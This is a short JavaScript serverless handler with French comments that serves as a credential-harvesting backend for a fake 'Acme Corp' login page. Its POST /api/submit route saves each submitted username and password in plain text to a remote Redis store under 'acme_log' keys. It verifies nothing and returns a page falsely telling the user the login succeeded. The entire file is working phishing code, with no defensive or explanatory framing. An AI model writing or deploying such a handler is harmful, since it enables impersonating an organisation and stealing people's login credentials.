const { Redis } = require('@upstash/redis');

// Connexion à Redis avec les variables d'environnement de Vercel
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

// Le handler pour Vercel
module.exports = async (req, res) => {
  // Gérer la route POST /api/submit
  if (req.method === 'POST' && req.url === '/api/submit') {
    const { username, password } = req.body;
    
    const logKey = `acme_log:${Date.now()}`;

    try {
      await redis.hset(logKey, { username, password, date: new Date().toISOString() });
      console.log(`Sauvegardé: ${logKey}`);
    } catch (error) {
      console.error('Erreur Redis:', error);
    }

    // Afficher la page de confirmation
    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Connexion réussie</title>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
                .message-box { background-color: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
                h1 { color: #1a73e8; }
                p { color: #5f6368; }
            </style>
        </head>
        <body>
            <div class="message-box">
                <h1>Connexion réussie</h1>
                <p>Vous êtes maintenant connecté à Acme Corp.</p>
            </div>
        </body>
        </html>
    `);
    return;
  }

  // Pour toutes les autres requêtes à l'API, renvoyer une erreur 404
  res.status(404).send('API endpoint not found.');
};